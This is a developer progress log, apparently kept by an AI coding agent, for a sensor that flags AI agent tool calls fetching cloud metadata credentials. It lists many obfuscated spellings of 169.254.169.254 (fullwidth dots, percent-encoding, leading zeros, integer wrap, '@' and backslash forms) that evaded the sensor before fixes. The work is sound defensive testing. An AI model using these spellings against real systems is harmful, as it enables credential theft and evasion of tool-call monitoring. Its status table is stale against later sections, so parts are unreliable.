[empty-hex-part] 252 ... 'http://0x.0x.0': url_parse=None, ada-url (WHATWG), httpx, urllib.parse, urllib3 reach private
1428 spellings where url_parse reports a class no consumer reaches; 'http://١٦٩.٢٥٤.١٦٩.٢٥٤': url_parse=link_local, readings={'urllib.parse': None}
fullwidth dots: httpx reaches 169.254.169.254 for 'http://169．254．169．254/latest' and url_parse reports address=None, so a credential fetch through it is not blocked
percent-encoded: urllib3 reaches 169.254.169.254 for 'http://%31%36%39.254.169.254/' and url_parse reports address=None, so a credential fetch through it is not blocked
3 host spellings the resolver reaches at a more severe class than url_parse reports: [('0x.0x.0', ...0.0.0.0, None), ('0x.1.1.1', ...0.1.1.1, None), ('169．254．169．254', ...169.254.169.254, None)]
2 host spellings where the resolver reaches an address the core never names: [('0x.0x.0', '0.0.0.0', ['dns:0x.0']), ('0x.1.1.1', '0.1.1.1', ['dns:1.1'])]
1 decimal integers above 2**32-1 that the resolver wraps to an address neither url_parse nor the core reads: [('4294967296', '0.0.0.0', None, ['dns:4294967296'])]
12 failed, 8 passed
```

**Found by M2, not in the plan:** `urlsplit-refusal`. When `urlsplit` raises,
url_parse returned None, meaning "not a URL". httpx, urllib3 and WHATWG send
`http://&a:foo(b]c@169.254.169.254/` to the link-local address anyway.

**Counts by class (M2 silent-failure review).** The M2 per-class counts used
first-match order, with backslash before refusal. 176 of the 2,742 backslash
rows are really refusals. From M3 on, refusal is checked first.

### Green at M2: four interpreters

```
== macOS 3.12.2      8 passed, 12 xfailed
== linux 3.10.21    10 passed, 10 xfailed
== linux 3.11.16    10 passed, 10 xfailed
== linux 3.12.14    10 passed, 10 xfailed      (the 2 darwin-conditional xfails pass on Linux)
```

**CI on `f95f5df`: green.** PR #34, GitHub Actions run `37173748403`, "CI completed success"; DCO run `37173748321` passed.

### Sabotage at M2: the reading set cut to `urllib.parse` alone

```
macOS:  [XPASS(strict)] special-scheme-without-//, urlsplit-refusal, percent-encoded-host
        XFAIL (still)   backslash, fullwidth, empty-hex-part      4 failed (incl. non-vacuity)
linux:  XPASS(strict) also empty-hex-part (glibc refuses 0x.)     5 failed
restored byte-identical (sha 54a1fdf4...), 8 passed, 12 xfailed
```

**The plan's sabotage claim was wrong, and it is retracted in place in
ARCHITECTURE.md §5 M2.** The fullwidth class stays a genuine xfail with
`urllib.parse` alone: `getaddrinfo` runs Python's IDNA codec, which maps
U+FF0E. The M2 milestone reviewer cut `_oracles()` itself rather than the
comparison loop. With that cut, the two named F3 tests fail with a
`KeyError` instead of flipping, so that sabotage proves nothing through them.

### Two darwin-only resolver classes beyond Q22, held for the owner

1. **Integer wrap.** The macOS resolver reads a number above 2**32-1 modulo
   2**32: `4294967296` → `0.0.0.0`, and WPT's `0x100000000` → `0.0.0.0`.
   glibc and WHATWG refuse both. It is pinned as a strict xfail on darwin
   (`test_bsd_libc_integer_wrap_is_an_unruled_platform_class`, decimal form).
   It is neither exempted nor read.
2. **A leading zero in an embedded IPv4** (WPT
   `https://[0:1:2:3:4:5:192.0.02.1]/`). urllib3 hands the host to the macOS
   resolver, which reads `0:1:2:3:4:5:c000:201`. It is a public class, so it
   moves no block decision. Found by the M3 WPT run. Not pinned yet.

### Fresh-context reviews of M2

- **silent-failure-hunter.**
  1. First-match ordering misattributed 176 refusals to the backslash class.
     Fixed at M3.
  2. `_resolve`'s `ValueError` branch is likely dead.
  3. The exemption predicates are exact.
  4. The floors are real.
  5. Refuse-not-skip holds.
- **milestone-reviewer.** It confirmed every count and both platform halves.
  It found the following. Each is fixed at M3 unless the line says otherwise.
  1. Rule 2 (named over-read classes) was a blanket xfail.
  2. **"urllib.request passes the raw netloc on" is false.** It percent-decodes
     the host and reaches `%31%36%39.254.169.254`. Retracted in place
     everywhere it was written, including a docstring in `_authority.py`.
     urllib.request is not among the four oracles; this is named, not fixed.
  3. **Q22's exemption hides a link-local reach on darwin.**
     `000169.254.000169.254` resolves to 169.254.169.254 there, ~~and url_parse
     and the core read octal `121.254.121.254`~~ *[retracted, M3 review,
     measured: url_parse reads NO address and the core `dns:000169.254`, since
     `000169` is not octal; `169.000254.169.000254` reads public
     `169.172.169.172` in both. The same false premise is in commit `6463337`'s
     message, which is not rewritten (no force-push)]*. Q22 was ruled on the premise
     "the decimal reading lands in 240/4", which is false for these forms.
     Pinned as a darwin strict xfail
     (`test_q22_exemption_hides_no_link_local_reach`) **for a re-ruling**.
  4. ARCHITECTURE.md called urlsplit-refusal "WHATWG-only". Corrected.
  5. No M2 evidence was in the commit. This section is it.
  6. **Q19 (vendoring WPT) was dropped without saying so.** It is still not
     vendored. M3 ran WPT from the pinned copy instead (sha256 `81e85fd3…f652`,
     commit `c48d5874`). Vendoring is open.
  7. The departures from §2.4 were not stated. They are now annotated in
     §2.4.

---

## M3 — url_parse moved onto the core's host canonicalisation. **Green on four interpreters.**

**Commits.**
- `dfb4334`: core, **SEMANTIC, a new paid pin**. `coerce_ip` reads an empty
  hex part as 0 and digit-checks integer parts.
- `e2e8bb9`: the url_parse move.
- `6463337`: the outside driver, the named over-read classes, the Q22
  consequence pin and the retractions. It includes a behaviour-neutral
  DOCSTRING change in `_authority.py`, which still changes the pin bytes.

**How the move is built.** Q5 (a) "a shared helper" needed no new helper: url_parse calls the core's
existing `classify_value` (every reading: WHATWG, 3.12.2's RFC split, the
refusal reading, R4) and `_host_authority` (the whole host pipeline) directly,
so the pipeline order lives only in the vendored unit. `address` = the most
severe class across those readings plus this interpreter's `urlsplit` host
(which also covers `file:`). `UrlShape.host` keeps urlsplit's spelling.

### `https://0x.0x.0/`: fixed, not left as an xfail (`dfb4334`)

Red against the unfixed core:

```
E  AssertionError: assert Authority(sch... value='0x.0') == Authority(sch...lue='0.0.0.0')
E  AssertionError: M3-empty-hex-part (...): ...
E  AssertionError: 2 host spellings where the resolver reaches an address the core never names: [('0x.0x.0', '0.0.0.0', ['dns:0x.0']), ('0x.1.1.1', '0.1.1.1', ['dns:1.1'])]
3 failed
```

Pre-fix against fixed core (`git show` of the pre-fix file, run side by side):

```
https://0x.0x.0/         pre-fix=dns:0x.0       fixed=ip:0.0.0.0
http://0x.1.1.1/         pre-fix=dns:1.1        fixed=ip:0.1.1.1
http://0x/               pre-fix=dns:0x         fixed=ip:0.0.0.0
http://0x_1.1.1.1/       pre-fix=ip:1.1.1.1     fixed=dns:1.1     (int() took the `_`; no resolver does)
http://0_7.1.1.1/        pre-fix=ip:7.1.1.1     fixed=dns:1.1
http://0x1f.1/           pre-fix=ip:31.0.0.1    fixed=ip:31.0.0.1
```

**`expected.jsonl`.** sha256 `d8bd14cd…ffbd53` → `dc9329b6…7109b`. That is one
added row, `M3-empty-hex-part`, regenerated by `convert.py --rev 01450c7…`.
SEMANTIC, so paid's re-vendor bumps `EVALUATOR_GENERATION`.

**Green for `dfb4334`.**

```
== macOS 3.12.2      503 passed, 22 xfailed
== linux 3.10/3.11/3.12   504 passed, 21 xfailed each
```

### url_parse move (`e2e8bb9`): red first, then green

The M2 strict xfails were un-xfailed first, and the run went red against the
unmoved url_parse. Ten failures, the same classes and counts as M2's
`--runxfail` above:

```
10 failed, 9 passed, 1 xfailed
```

Green on the M3 tree (`6463337`); the final numbers are just below. The suites are the url_parse and core
differentials, `test_url_classes`, `test_differential_parsers`, conformance,
C-11, the 456-row oracle and `tests/outside`:

```
== macOS 3.12.2      587 passed, 19 xfailed
== linux 3.10.21     589 passed, 17 xfailed
== linux 3.11.16     589 passed, 17 xfailed
== linux 3.12.14     589 passed, 17 xfailed
```

**Final tree** (after `ea7fa59` and the milestone-review fixes):

```
== macOS 3.12.2      604 passed, 20 xfailed
== linux 3.10.21     606 passed, 18 xfailed
== linux 3.11.16     606 passed, 18 xfailed
== linux 3.12.14     606 passed, 18 xfailed
```

**Honest reds on the way, each fixed before the green above.**
1. Over-reads of Q22's class from the other side: 534 on darwin. url_parse
   reads octal link-local, and the macOS resolver reads decimal.
2. Over-reads from the core's one host pipeline: 356. The pipeline
   percent-decodes, strips the root dot and parses an empty hex part, on hosts
   that only RFC readings split out.
3. 296 over-reads of M0's `urlsplit-bracket-validation` class, on Linux only.
4. 24 darwin over-reads that the bracket predicate grabbed. Their real cause
   was Q22. The mechanism classes are now checked first.
5. 134 Linux over-reads behind a `\@`, which glibc refuses: `0x.0x.0`.

Each class is named with a reason and pinned. The Q22 and bracket classes
are pinned both ways, by platform or interpreter. The pipeline class must
absorb something, or it is red.

### F3: each spelling named with the consumer that reaches it

| spelling | before M3 | after | consumer that reaches 169.254.169.254 |
|---|---|---|---|
| `http://169．254．169．254/latest` | None | link_local | httpx (also urllib.parse+resolver, ada) |
| `http://%31%36%39.254.169.254/` | None | link_local | urllib3 (also ada, and urllib.request per the M2 review) |
| `http://１６９.２５４.１６９.２５４/latest` | link_local | link_local (pinned) | ada; urllib.parse+resolver |

**F3's "live bypass" was half true, and that is measured.** On `http://`, the
`SHELL_cloud_metadata_credentials` regex accident already flagged the
fullwidth-dots spelling at 0.90 before M3. The live bypass was the
`https://` form, which went from `allowed 0.0000` to `flagged 0.9000`. The
percent form was a live bypass on both schemes.

### Sabotage, both directions

```
=== SABOTAGE M3: url_parse reverted to its pre-M3 bytes (_coerce_ip)
E  AssertionError: fullwidth dots: httpx reaches 169.254.169.254 for 'http://169．254．169．254/latest' and url_parse reports address=None, so a credential fetch through it is not blocked
E  AssertionError: percent-encoded: urllib3 reaches 169.254.169.254 for 'http://%31%36%39.254.169.254/' and url_parse reports address=None, so a credential fetch through it is not blocked
10 failed, 11 passed, 1 xfailed
=== same sabotage: tests/test_url_classes.py (must stay green)
98 passed
=== SABOTAGE M3-b: the naive move, the core's coerce_ip ALONE on the urlsplit host
E  AssertionError: fullwidth digits: ada-url (WHATWG) reaches 169.254.169.254 for 'http://１６９.２５４.１６９.２５４/latest' and url_parse reports address=None, so a credential fetch through it is not blocked
8 failed, 2 passed
=== RESTORED (sha 15c063a0..., byte-identical)
```

### Outside the process: built wheels, fresh venvs, `python -I`

**The Q4 delta list.** `tests/outside/drivers/url_parse_deltas.py` sends 32
spellings through `scan_tool_call("http_get", ...)` of the installed sensor.
The base wheel is `f95f5df`; HEAD is the M3 tree. `--compare` exits 0 only if
the moved set equals the declared set.

```
  MOVED  'http://%31%36%39.254.169.254/latest'       base=allowed 0.0000 - -  head=flagged 0.9000 credential_access net.metadata_link_local
  MOVED  'https://169．254．169．254/latest'          base=allowed 0.0000 - -  head=flagged 0.9000 credential_access net.metadata_link_local
  MOVED  'https://169.254.169.254\\latest'           base=allowed 0.0000 - -  head=flagged 0.9000 ...
  MOVED  'https://169.254.169.254\\@corp.example/'   base=allowed 0.0000 - -  head=flagged 0.9000 ...
  MOVED  'https:169.254.169.254/latest'              base=allowed 0.0000 - -  head=flagged 0.9000 ...
  MOVED  'https://&a:foo(b]c@169.254.169.254/latest' base=allowed 0.0000 - -  head=flagged 0.9000 ...
  MOVED  'http://١٦٩.٢٥٤.١٦٩.٢٥٤/latest'             base=flagged 0.9000 credential_access net.metadata_link_local  head=allowed 0.0000 - -
  MOVED  (6 http:// spellings: same action, flagged 0.9000, rules gain net.metadata_link_local)
  same   19 controls, incl. fullwidth DIGITS, 0x.0x.0 (private: classify-only), 1.2.3.256, metadata.google.internal
moved=13 declared=13 undeclared_moves=[] declared_but_unmoved=[]
```

That first list was **incomplete** (M3 milestone review, above). On the final
tree, against the same base wheel:

```
head: OFF, RECORD and ENFORCE identical on every spelling: True
  MOVED  'ws://169．254．169．254/'              base=allowed 0.0000 - -  head=flagged 0.9000 credential_access net.metadata_link_local
  MOVED  'https://169。254。169。254/'           base=allowed 0.0000 - -  head=flagged 0.9000 ...
  MOVED  'https://169.254.169.254%2e/'        base=allowed 0.0000 - -  head=flagged 0.9000 ...
  MOVED  'gopher://%31%36%39.254.169.254/'    base=flagged 0.8500 execute net.scheme_smuggling  head=flagged 0.9000 credential_access net.metadata_link_local
  MOVED  'http://0x_A9FEA9FE/'                base=flagged 0.9000 credential_access net.metadata_link_local  head=allowed 0.0000 - -
  same   '169.254.169.254./latest'            (control: refused before M3 and again now)
  ... (27 moved in all, 21 controls)
moved=27 declared=27 undeclared_moves=[] declared_but_unmoved=[]
```

The default sensor flags; it does not block. `flagged` at 0.90 is the action
the link-local rule produces in the default enforcement mode.
`tests/outside/test_m3_url_parse_from_the_wheel.py` asserts the HEAD half in
CI's `full` config.

**C-11 across commits** (base `f95f5df` OFF against M3's OFF, RECORD and
ENFORCE, from built wheels): **all 18 pass×mode digests identical**.
They match M1's digests.

```
  block   P-input   base=80f31ff0b5d5 off=80f31ff0b5d5 record=80f31ff0b5d5 enforce=80f31ff0b5d5  IDENTICAL
  ... (18 rows) ...
cross-commit: all identical
```

**Deviation from §3.2 item 3, stated.** The §2.2 grid was NOT appended to
P-flow-R. The C-11 corpora contain none of M3's delta spellings, so no C-11
row moved. The requirement that "at least one listed row must move" is met by
the delta driver (13 = 13), not by C-11. `c11_oracle.py --compare` also
assumes a base wheel that predates `value_origin=`. Against `f95f5df` it
raised `KeyError: 'default/block'`, so the 18 rows above came from a
scratchpad comparison of base OFF against HEAD's three modes.

### Adversarial: WPT urltestdata.json (560 absolute inputs, a corpus M3 was not built on)

```
pre-M3 url_parse, macOS:  7 under-reads (incl. https://0x.0x.0, https://0x.0x.0x.0x reached by ada)
M3 url_parse,     macOS:  5 under-reads, all macOS-resolver readings, none link-local:
                            3 x Q22 decimal (09.2.3.4, 1.2.3.08, 1.2.3.09 -> public)
                            0x100000000 -> 0.0.0.0 (the unruled wrap class, hex form)
                            [0:1:2:3:4:5:192.0.02.1] -> public (a third darwin class)
M3 url_parse,     linux 3.12.14: 0 under-reads, 0 over-reads
```

### Fresh-context reviews of M3

- **silent-failure-hunter, on `6463337`.**
  1. **Medium, fixed in the next commit.** `parse_url`'s blanket `except
     Exception: return None` now wrapped the core's readings. A fault there
     turned a link-local URL into "not a URL", silently. The core calls are
     now isolated. A fault is logged once per process at ERROR, and the
     `urlsplit` reading still classifies the URL. Red first:
     ```
     E  AssertionError: a core fault made a link-local URL read as None: the credential fetch would go unclassified, silently
     ```
     Then green (`121 passed, 3 xfailed`, url_classes + differentials).
  2. The refused branch: no regression.
  3. The `coerce_ip` digit checks change exactly the two stated behaviours.
     The reviewer ran `0X1F`, `00`, `08`, `0x1_f` and whitespace.
  4. Q22's darwin link-local reach is open and pinned; it is not resolved.
  5. No vacuous passes. Its run gave `502 passed, 9 xfailed`.
- **milestone-reviewer, on `6463337`.** It reproduced the 13/13 delta compare,
  the sabotage, the expected.jsonl regeneration byte for byte, and Linux.
  It found the following; each is fixed in the commit after `ea7fa59`.
  1. **The declared list was incomplete.** "Moved equals declared" held only
     over the driver's own spellings. Moving and undeclared were:
     - `ws`, `wss` and `ftp` forms;
     - U+3002 and U+FF61 dots;
     - `https:///`, `https:\\` and `%2e`;
     - the M3a digit-check consequences (`0x_A9FEA9FE`, `0_251…`, both now
       allowed);
     - gopher and file percent hosts, whose rule, score and category change.

     All are declared now. The differential's fullwidth class and its grid now
     include U+3002 and U+FF61.
  2. **A new over-read.** Scheme-less `169.254.169.254./latest` became
     link_local, and both resolvers refuse it. The scheme-less branch refuses
     a root dot again, as it did before M3. It is a driver control, and it does
     not move.
  3. **C-11 was vacuous for M3.** No C-11 corpus row contains a delta spelling.
     The delta driver now also runs every spelling under OFF, RECORD and
     ENFORCE, and `--compare` fails unless all three are identical at HEAD.
     The CI test asserts it too. **Still not done:** §3.2's "append the §2.2 grid
     to P-flow-R" in `c11_oracle.py`, and a delta allowance in its
     `compare()`. The delta driver carries C-11 for the spellings M3 moves.
  4. **False claims, retracted in place.**
     - "raw netloc" was still in the rulings doc, line-wrapped where my grep
       missed it.
     - The Q22 premise "url_parse and the core read octal 121.254.121.254" is
       false. They read no address and `dns:000169.254`. It is corrected in
       the xfail reason and above, and it also stands in commit `6463337`'s
       message, which is not rewritten.
     - "The macOS resolver reads `0x`" is false: it refuses `0x` alone.
     - The PROGRESS evidence was missing at `6463337`. It landed in `ea7fa59`.

### Found, not fixed

- **R4 hostnames.** `http:metadata.google.internal/x` (no `//`): url_parse
  returns None, so the hostname rules never see it, and WHATWG reaches the
  name. `address` comes from the core now. `host` still comes from urlsplit,
  as §2.1 required. It is pinned as a strict xfail,
  `test_r4_a_metadata_hostname_without_slashes_reaches_the_hostname_rules`.
  The WHATWG reach is checked first with `pytest.fail`, so a broken
  precondition cannot pass as the xfail. Its red:
  ```
  E  AssertionError: WHATWG reaches metadata.google.internal for 'http:metadata.google.internal/computeMetadata/v1/'; url_parse gives None
  ```
- **urllib.request** is not one of the oracles (M2 review, item 2).
- **Q19 vendoring** is open (see above).

---

## Q22 re-ruled, and R4 applied to url_parse (before M4), `75f5a2a`

**Q22, re-ruled by the owner on 2026-10-04.** The old premise, that the
decimal reading lands in reserved space, was wrong.
`000169.254.000169.254` reaches 169.254.169.254.

**Measured on macOS before writing the tests.** The resolver differs from
inet_aton and WHATWG in three ways:
1. A leading-zero dotted quad is read as DECIMAL.
2. So is the IPv4 tail of an IPv6 literal.
3. A single number above 2**32-1 wraps modulo 2**32, in decimal, hex and
   octal. For example, `0x1A9FEA9FE` → 169.254.169.254.

**Two facts the ruling did not anticipate**, both applied by its general rule
(STOP item):
- The embedded class is not always public. `[::ffff:169.254.0169.254]`
  resolves to the mapped link-local address, so it is READ.
- Q22's own example, 251.254.251.254, is `is_private` to `ipaddress`.

**Red first:** 14 named failures, including:

```
E  AssertionError: the macOS resolver sends 'http://000169.254.000169.254/latest' to 169.254.169.254 (link_local); the core reads ['dns:000169.254'] and url_parse reports None
E  AssertionError: the macOS resolver sends 'http://0x1A9FEA9FE/latest' to 169.254.169.254 (link_local); the core reads ['dns:0x1a9fea9fe'] and url_parse reports None
E  AssertionError: the macOS resolver sends 'http://[::ffff:169.254.0169.254]/latest' to 169.254.169.254 (link_local); the core reads [] and url_parse reports None
E  AssertionError: WHATWG reaches metadata.google.internal for 'http:metadata.google.internal/computeMetadata/v1/'; url_parse gives None
14 failed, 2 passed
```

**Green:**
- macOS 3.12.2, and Linux 3.10.21, 3.11.16 and 3.12.14: 617 passed, 17
  xfailed each.
- `expected.jsonl` gains the `Q22-rerule-macos-decimal-quad` row. SEMANTIC.

**Sabotage.** Dropping the core's macOS readings and url_parse's R4 host
turns the same 14 red. The pre-existing gates (`test_url_classes` and the M0
core differential) stay green: `105 passed`.

**R4: I ruled the M3 xfail a contradiction, and fixed it.** It is the same
consumer fact as R4 and the same superset obligation; the reasons are in the
rulings doc. The hostname MIRROR shape (`metadata.google.internal\@corp.example`)
is named open.

---

## M4 — tool-call evaluation, RECORD only. **Green. STOP AND REPORT.**

**Build.**
- `scan_tool_call` evaluates `evaluate_call` FIRST: before the gates, the
  breaker and `_resolve_provenance` (V-7a).
- It attaches `ScanResult.value_origin` once, around the whole body, so every
  exit carries it (C-13). This replaces the plan's attach-at-each-exit. ~~A new exit path cannot be
  added without it.~~ *[Retracted, M4 review: a caller that builds a fresh
  result after the wrapper loses the verdict. `autopatch.tool_verdict`
  carries it, and that is now tested.]*
- OFF evaluates nothing.
- `autopatch.tool_verdict`'s fresh `TOOL_BLOCKED` result keeps the verdict.
- Q6, as ruled: the first `no_flow` call per sensor logs ONE warning naming
  `begin_flow()` and `extract_context()`.

**Red first.** The first red run hit a driver bug of mine: an open circuit
gates only in `block` mode. The path precondition caught it, which is what it
is for. After fixing that, the red against the unchanged sensor was:

```
E  AssertionError: [record] the scan_error call never reached its path: allowed scan_error SCAN_FAILED_OPEN   (my marker was wrong; fixed)
E  AssertionError: None                                             (no value_origin: no_flow expected)
E  AssertionError: Q6: three no_flow calls on one sensor logged 0 begin_flow() warnings; the owner's ruling is exactly one
3 failed
```

**Green** on the M4 suites, C-11, the 456-row oracle, `tests/outside`
(including `test_m4_from_the_wheel`), url_classes, conformance and the
differentials:

```
== macOS 3.12.2      593 passed, 13 xfailed
== linux 3.10.21     593 passed, 13 xfailed
== linux 3.11.16     593 passed, 13 xfailed
== linux 3.12.14     593 passed, 13 xfailed
```

The seven test files that inspect logs around tool calls: 150 passed, 79
skipped. The skips are the real-framework tests, which CI's dedicated job
runs.

**Sabotage, each a named red.**

```
=== A: attach skipped on the circuit-open exit
E  AssertionError: C-13: every tool-call exit carries the verdict, and these do not: [record] circuit exit (_emit_circuit_open_verdict): value_origin wire=None, want 'no_flow'; [enforce] circuit exit (_emit_circuit_open_verdict): ...
--- same sabotage, the C-11 gate: 20 passed   (discriminating: C-11's digests cannot see the attach)
=== B: the once-guard dropped
E  AssertionError: Q6: three no_flow calls on one sensor logged 3 begin_flow() warnings; the owner's ruling is exactly one
=== C: the warning dropped
E  AssertionError: Q6: three no_flow calls on one sensor logged 0 begin_flow() warnings; the owner's ruling is exactly one
```

**A sabotage-procedure finding.** The first run after restoring gave
`1 failed`.
- Sabotage C (`if first:` → `if False:`) is the same byte length as the
  original: 220,520 bytes both ways.
- The restore landed within the bytecode's mtime resolution.
- So CPython kept the sabotaged `.pyc`.
- With `__pycache__` cleared: `3 passed`.

A same-length sabotage can therefore leak past its own restore. From now on,
sabotage runs use `PYTHONDONTWRITEBYTECODE=1`.

**From outside the process.** `tests/outside/test_m4_from_the_wheel.py` runs
the same driver from the built wheel in a fresh venv. It checks:
- every exit's marker, then its wire;
- `no_flow`, then `ledger_absent` after `begin_flow()`;
- one Q6 warning.

**C-11 across commits.** Base `75f5a2a` OFF against M4's OFF, RECORD and
ENFORCE, from wheels: **all 18 identical**, P-input block `80f31ff0b5d5`.

**Still strict xfails, as planned:** 4a-I (M6), 4a-R (M7) and 4b (M8).
`no_destination` and `truncated` are unreachable until M5 binds a ledger.

---

## M4 fresh-context reviews, and what changed after them (`9ac4474` → the next commit)

**CI on `9ac4474`: green.** 13 of 13 checks, run `37178759851`, including
the full `pytest` matrix.

**silent-failure-hunter, medium-high.** `replace(result, value_origin=cv)` sat
outside the fail-open body. An extension's `gate` or `transform_verdict` can
return a non-dataclass with a valid `.action`, and the attach then raised into
the host. **Fixed:** the result comes back unmodified, and the fault is logged
once per sensor. Red first:

```
E  TypeError: replace() should be called on dataclass instances
```

**milestone-reviewer.** Every red, every sabotage, the outside run and a
Linux leg reproduced. What it found:
1. The same `replace()` defect, from the `gate` path as well. Fixed above.
2. **The DEFAULT `Sensor` (`value_origin="record"`) now logs the Q6 warning
   on its first unflowed tool call.** That reaches every existing user who
   never calls `begin_flow()`, and nothing said so. It is stated here and in
   the report. The stale "INERT" comment in `sensor.py` is corrected in
   place. README and `docs/api.md` still say nothing about `value_origin`.
   **Not done.**
3. **The autopatch claim had no test.** Now it has one. Red with the line
   removed: `the TOOL_BLOCKED exit lost value_origin: None`. "A new exit path
   cannot be added without it" is retracted in place.
4. **`75f5a2a` moved detection, undeclared** (on OFF wheels):
   `https://000169.254.000169.254/latest`, `https://0x1A9FEA9FE/latest` and
   `https:metadata.google.internal/…` all went `allowed` → `flagged`. They
   are now declared. Base `f95f5df` against this tree gives `moved=30
   declared=30 undeclared_moves=[]`, and OFF, RECORD and ENFORCE are
   identical on every spelling.
5. **The Q22 change over-reads on Linux, and no gate names it.**
   - `010.0.0.1` reaches public `8.0.0.1` on glibc, and url_parse reports
     `private`.
   - None of the Q22 spellings are in either gate's corpus.
   - This is the ruling's intended effect (read on every platform), but §2.3
     rule 2 wants a named class. **Open.**
6. **Integer wraps that land in public space are still exempt.** On macOS,
   `4311810312` resolves to `1.1.1.8`. Under ENFORCE, an untrusted public IP
   in the ledger is reachable through that spelling. The ruling's text says
   "integer wrap is NOT exempt", and its reason is sensitivity. **Held for
   the owner:** read ALL macOS readings in the core, or only sensitive ones?
7. **R4 framing.** "Contradicted a settled ruling" overreached, because §2.1
   limited M3 to `address`. It is qualified in place as a gap closed by
   choice under Q2.
8. **`c11_oracle --compare` crashed** on a base wheel that already has
   `value_origin=`. Fixed: it falls back to the base's OFF digests. Run on
   `75f5a2a` against M4, it says `cross-commit: all identical`.

**Refuted by the reviewer:**
- A re-raise path that loses the verdict: none. Contract errors carry no
  `ScanResult`.
- V-7a: it holds. The docstring's reason ("which can start a flow") was
  wrong and is fixed.

**Final M4 tree.** The files are `tests/test_value_origin_m4.py`,
`tests/outside/test_m4_from_the_wheel.py`,
`tests/outside/test_m3_url_parse_from_the_wheel.py`,
`tests/test_value_origin_c11.py`, `tests/test_differential_oracles.py`,
`tests/value_origin_conformance`, `tests/test_url_classes.py` and
`tests/test_seam_zero_movement.py`:

```
== macOS 3.12.2    574 passed, 13 xfailed
== linux 3.12.14   574 passed, 13 xfailed
```

---

## Status (updated after M3), and what is waiting on the owner

| milestone | state | commit |
|---|---|---|
| M0: finding 1 (Q1) | green, **STOP AND REPORT** | `77ee2f8` (the new paid pin, SEMANTIC) |
| M1: the C-11 gate | green, **STOP AND REPORT** | `a4df0e6` |
| M2: url_parse differential (tests only) | green on 4 interpreters; CI green (run 37173748403) | `f95f5df` |
| M3: url_parse onto the core | green on 4 interpreters; CI: see the M3 report | `dfb4334` (core, **SEMANTIC, new paid pin**), `e2e8bb9`, `6463337` (docstring-only core bytes) |
| M4–M7: seam wiring | **held**: the BRIEF STOPs before any seam wiring until the owner has seen C-11 | — |
| M8: ENFORCE | **held**: needs the owner's review of M0, plus STOP 3 (vocabulary) | — |
| M9: wire field | held at STOP 4 (wire format) | — |
| M10 / M11 | after the above | — |

**Waiting on the owner (added at M3):**
- **Q22 re-ruling.** The exemption also hides a darwin link-local reach
  (`000169.254.000169.254`). It was ruled on the premise that the decimal
  reading lands in 240/4. Pinned as a darwin strict xfail.
- **Two further darwin resolver classes**, not covered by Q22: integer wrap
  (`4294967296`, `0x100000000` → `0.0.0.0`), and a leading zero in an embedded
  IPv4 (`[0:1:2:3:4:5:192.0.02.1]`). Neither is exempted. The wrap is pinned.
- **Paid pins.** `dfb4334` is SEMANTIC (`expected.jsonl` +1 row). `6463337`
  changes `_authority.py`'s docstring only. A re-vendor takes the last one.
- **Q19.** The WPT corpus is still not vendored. It was run from a pinned
  copy.

**Waiting on the owner (from M1):**
1. Review M0, which unblocks ENFORCE (M8).
2. Review C-11 (M1), which unblocks the seam wiring (M4–M7).
3. Rule on the four M0 build decisions in `docs/value-origin-rulings.md`
   ("Decisions made in the A2 build (M0) that still need a ruling").
4. M0 changed `expected.jsonl`. It is a semantic change for paid (P4), and pin
   `77ee2f8` vendors only once it is on `main`.

**Not verified:**
- CI has not run on this branch. It triggers on `pull_request` and on pushes to
  `main`, and no PR was opened.
- The `ci.yml` marker change was exercised locally in `python:3.12-slim`, not on
  GitHub runners.
